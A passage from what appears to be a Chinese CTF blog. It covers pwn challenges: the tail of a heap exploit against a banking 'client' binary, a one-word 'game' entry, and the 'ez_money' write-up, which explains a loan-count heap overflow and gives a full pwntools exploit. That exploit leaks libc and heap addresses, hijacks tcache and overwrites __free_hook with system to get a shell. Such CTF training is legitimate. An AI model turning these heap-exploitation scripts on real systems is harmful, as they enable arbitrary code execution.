p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    <span class="comment">#p = process(challenge)</span></span><br><span class="line">    p = process([<span class="string">&#x27;./client&#x27;</span>,<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="string">&#x27;3339&#x27;</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process([<span class="string">&#x27;./client&#x27;</span>,<span class="string">&#x27;139.9.242.36&#x27;</span>,<span class="string">&#x27;4445&#x27;</span>])</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x19DA)\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">choice</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;your choice :&quot;</span>,choice)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params"><span class="built_in">id</span>,passwd,money</span>):</span></span><br><span class="line">    cmd(<span class="string">&quot;new_account&quot;</span>) </span><br><span class="line">    sla(<span class="string">&quot;please input the account id&quot;</span>,<span class="built_in">id</span>)</span><br><span class="line">    sla(<span class="string">&quot;please input the password&quot;</span>,passwd)</span><br><span class="line">    sla(<span class="string">&quot;please input the money&quot;</span>,<span class="built_in">str</span>(money))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">passwd</span>):</span>            </span><br><span class="line">    cmd(<span class="string">&quot;cancellation&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;please enter the password&quot;</span>,passwd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quit</span>():</span></span><br><span class="line">    cmd(<span class="string">&quot;exit_account&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">query</span>():</span></span><br><span class="line">    cmd(<span class="string">&quot;query&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>(<span class="params">account,passwd</span>):</span></span><br><span class="line">    cmd(<span class="string">&quot;login&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;please input the account id&quot;</span>,account)</span><br><span class="line">    sla(<span class="string">&quot;please input the password&quot;</span>,passwd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>(<span class="params">account,passwd</span>):</span></span><br><span class="line">    cmd(<span class="string">&quot;transfer_account&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Please enter the remittance amount&quot;</span>,account)</span><br><span class="line">    sla(<span class="string">&quot;please input your pasword&quot;</span>,passwd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">passwd,old_passwd</span>):</span></span><br><span class="line">    cmd(<span class="string">&quot;update_pwd&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;please entet  a new password&quot;</span>,passwd)</span><br><span class="line">    sla(<span class="string">&quot;please input your pasword.&quot;</span>,old_passwd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stat_query</span>():</span></span><br><span class="line">    cmd(<span class="string">&#x27;stat_query&#x27;</span>)</span><br><span class="line"></span><br><span class="line">stat_query()</span><br><span class="line"></span><br><span class="line">leak_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x21c87</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system_libc = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;free_hook &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(<span class="built_in">str</span>(i)*<span class="number">8</span>,<span class="string">&quot;123456&quot;</span>,<span class="number">0x61</span>)</span><br><span class="line">    quit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    login(<span class="built_in">str</span>(i)*<span class="number">8</span>,<span class="string">&quot;123456&quot;</span>)</span><br><span class="line">    free(<span class="string">&quot;123456&quot;</span>)</span><br><span class="line"></span><br><span class="line">login(<span class="string">&quot;7&quot;</span>*<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>*<span class="number">8</span>)</span><br><span class="line">edit(p64(free_hook-<span class="number">0x10</span>),<span class="string">&quot;\x00&quot;</span>*<span class="number">8</span>)</span><br><span class="line">quit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(<span class="built_in">str</span>(i)*<span class="number">6</span>,<span class="string">&quot;123456&quot;</span>,<span class="number">0x61</span>)</span><br><span class="line">    quit()</span><br><span class="line"></span><br><span class="line">add(<span class="string">&quot;a&quot;</span>*<span class="number">8</span>,p64(system_libc),<span class="number">0x61</span>)</span><br><span class="line">quit()</span><br><span class="line">add(<span class="string">&#x27;&gt;&amp;4 &#x27;</span>,<span class="string">&#x27;cat flag&#x27;</span>,<span class="number">120</span>)</span><br><span class="line">free(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="game"><a href="#game" class="headerlink" title="game"></a>game</h2><p>非预期</p>
<h2 id="ez-money"><a href="#ez-money" class="headerlink" title="ez_money"></a>ez_money</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.9</span>)</span> stable release version 2.31.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ez_money: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=d3173989de9ecef646bad08f24a9d5fda1061937, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped    </span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>在 <code>loan</code> 函数中有溢出：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( loan_index &gt; <span class="number">10</span> )</span><br><span class="line">&#123;</span><br><span class="line">  output(<span class="string">&quot;The loan has reached the upper limit of the system.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">2LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>由于 <code>loan</code> 函数的执行次数没有设置正确，导致程序有一个堆溢出</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>程序会先申请一个 chunk 来存放 <code>loan_info</code>，它的相邻下一个 chunk 就是 chunk_list 的第一个对象</p>
<ul>
<li>我们在存放 <code>loan_info</code> 的 chunk 中进行溢出，修改相邻下一个 chunk 的 size 大小，使其可以进入 largebin</li>
<li>然后释放掉 chunk_list 的第一个对象，使其进入 largebin，然后打印 <code>loan_info</code> 就可以泄露 libc_base</li>
</ul>
<p>由于 libc-2.31 有 key 值保护 tcachebin，因此我们需要用同样的方式来泄露 heap_base</p>
<ul>
<li>在之前生成的 unsortedbin 中申请新的 chunk，使其覆盖原来 chunk_list 的第一个对象</li>
<li>将其释放并组织一下堆风水就可以泄露 heap_base</li>
</ul>
<p>最后利用堆风水劫持 tcachebin 就好了</p>
<p>完整 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./ez_money&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x1888)\n&quot;</span>)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;your choice&quot;</span>,op)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params"><span class="built_in">id</span>,passwd,money</span>):</span></span><br><span class="line">    cmd(<span class="string">&quot;new_account&quot;</span>) </span><br><span class="line">    sla(<span class="string">&quot;please input the account id&quot;</span>,<span class="built_in">id</span>)</span><br><span class="line">    sla(<span class="string">&quot;please input the password&quot;</span>,passwd)</span><br><span class="line">    sla(<span class="string">&quot;please input the money&quot;</span>,<span class="built_in">str</span>(money))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">passwd</span>):</span>            </span><br><span class="line">    cmd(<span class="string">&quot;Cancellation&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;please enter the password&quot;</span>,passwd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quit</span>():</span></span><br><span class="line">    cmd(<span class="string">&quot;Exit_account&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>(<span class="params">account,passwd</span>):</span></span><br><span class="line">    cmd(<span class="string">&quot;login&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;please input the account id&quot;</span>,account)</span><br><span class="line">    sla(<span class="string">&quot;please input the password&quot;</span>,passwd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">passwd,old_passwd</span>):</span></span><br><span class="line">    cmd(<span class="string">&quot;Update_info&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;please entet  a new password&quot;</span>,passwd)</span><br><span class="line">    sla(<span class="string">&quot;please input your password.&quot;</span>,old_passwd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loan</span>(<span class="params">size,context</span>):</span></span><br><span class="line">    cmd(<span class="string">&quot;Loan_money&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Please enter the loan amount (no more than 1 million)&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&quot;Please leave your comments.&quot;</span>,context)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    add(<span class="built_in">str</span>(i)*<span class="number">0x20</span>,<span class="string">&quot;123456&quot;</span>,<span class="number">0x50</span>)</span><br><span class="line">    loan(<span class="number">0x50</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line">    quit()</span><br><span class="line"></span><br><span class="line">add(<span class="string">&quot;a&quot;</span>*<span class="number">0x8</span>+p64(<span class="number">0x461</span>)+<span class="string">&quot;w&quot;</span>*<span class="number">0x20</span>,<span class="string">&quot;123456&quot;</span>,<span class="number">10000000</span>)</span><br><span class="line">loan(<span class="number">0x50</span>,<span class="string">&quot;p&quot;</span>*<span class="number">0x18</span>)</span><br><span class="line">quit()</span><br><span class="line"></span><br><span class="line">add(<span class="string">&quot;b&quot;</span>*<span class="number">0x20</span>,<span class="string">&quot;123456&quot;</span>,<span class="number">10000000</span>)</span><br><span class="line">quit()</span><br><span class="line">add(<span class="string">&quot;c&quot;</span>*<span class="number">0x20</span>,<span class="string">&quot;123456&quot;</span>,<span class="number">10000000</span>)</span><br><span class="line">quit()</span><br><span class="line">add(<span class="string">&quot;d&quot;</span>*<span class="number">0x20</span>,<span class="string">&quot;123456&quot;</span>,<span class="number">10000000</span>)</span><br><span class="line">quit()</span><br><span class="line">add(<span class="string">&quot;e&quot;</span>*<span class="number">0x20</span>,<span class="string">&quot;123456&quot;</span>,<span class="number">10000000</span>)</span><br><span class="line">quit()</span><br><span class="line">add(<span class="string">&quot;f&quot;</span>*<span class="number">0x20</span>,<span class="string">&quot;123456&quot;</span>,<span class="number">10000000</span>)</span><br><span class="line">quit()</span><br><span class="line"></span><br><span class="line">login(<span class="string">&quot;w&quot;</span>*<span class="number">0x8</span>+<span class="string">&quot;p&quot;</span>*<span class="number">0x18</span>,<span class="string">&quot;w&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line">dele(<span class="string">&quot;w&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line">login(<span class="string">&quot;b&quot;</span>*<span class="number">0x20</span>,<span class="string">&quot;123456&quot;</span>)</span><br><span class="line">cmd(<span class="string">&quot;I&#x27;m vip!&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;aaaaaaaaa&quot;</span>)</span><br><span class="line">p.recv(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x1ecbe0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system_libc = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;free_hook &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line"></span><br><span class="line">quit()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    add(<span class="built_in">str</span>(i)+<span class="string">&quot;t&quot;</span>*<span class="number">0x1f</span>,<span class="string">&quot;123456&quot;</span>,<span class="number">0x50</span>)</span><br><span class="line">    quit()</span><br><span class="line"></span><br><span class="line">login(<span class="string">&quot;e&quot;</span>*<span class="number">0x20</span>,<span class="string">&quot;123456&quot;</span>)</span><br><span class="line">dele(<span class="string">&quot;123456&quot;</span>)</span><br><span class="line">login(<span class="string">&quot;f&quot;</span>*<span class="number">0x20</span>,<span class="string">&quot;123456&quot;</span>)</span><br><span class="line">dele(<span class="string">&quot;123456&quot;</span>)</span><br><span class="line"></span><br><span class="line">login(<span class="string">&quot;0&quot;</span>+<span class="string">&quot;t&quot;</span>*<span class="number">0x1f</span>,<span class="string">&quot;123456&quot;</span>)</span><br><span class="line">dele(<span class="string">&quot;123456&quot;</span>)</span><br><span class="line">login(<span class="string">&quot;2&quot;</span>+<span class="string">&quot;t&quot;</span>*<span class="number">0x1f</span>,<span class="string">&quot;123456&quot;</span>)</span><br><span class="line">dele(<span class="string">&quot;123456&quot;</span>)</span><br><span class="line">login(<span class="string">&quot;c&quot;</span>*<span class="number">0x20</span>,<span class="string">&quot;123456&quot;</span>)</span><br><span class="line">cmd(<span class="string">&quot;I&#x27;m vip!&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;aaaaaaaaQ&quot;</span>)</span><br><span class="line">p.recv(<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">heap_base = leak_addr - <span class="number">0x10</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">quit()</span><br><span class="line">login(p64(heap_base+<span class="number">0x10</span>)+<span class="string">&quot;t&quot;</span>*<span class="number">0x18</span>,p64(heap_base+<span class="number">0x580</span>))</span><br><span class="line">edit(p64(free_hook),p64(heap_base+<span class="number">0x580</span>))</span><br><span class="line"></span><br><span class="line">quit()</span><br><span class="line">add(<span class="string">&quot;g&quot;</span>*<span class="number">0x20</span>,<span class="string">&quot;123456&quot;</span>,<span class="number">10000000</span>)</span><br><span class="line">quit()</span><br><span class="line">add(<span class="string">&quot;h&quot;</span>*<span class="number">0x20</span>,p64(system_libc),<span class="number">10000000</span>)</span><br><span class="line"></span><br><span class="line">quit()</span><br><span class="line">login(<span class="string">&quot;d&quot;</span>*<span class="number">0x20</span>,<span class="string">&quot;123456\x00\x77&quot;</span>)</span><br><span class="line">edit(<span class="string">&quot;/bin/sh\x00&quot;</span>,<span class="string">&quot;123456\x00\x77&quot;</span>)</span><br><span class="line">dele(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/23/">23</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="yhellow"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">yhellow</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">221</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">12</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">134</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2019 – 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">yhellow</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="Symbols count total">2.9m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">44:08</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
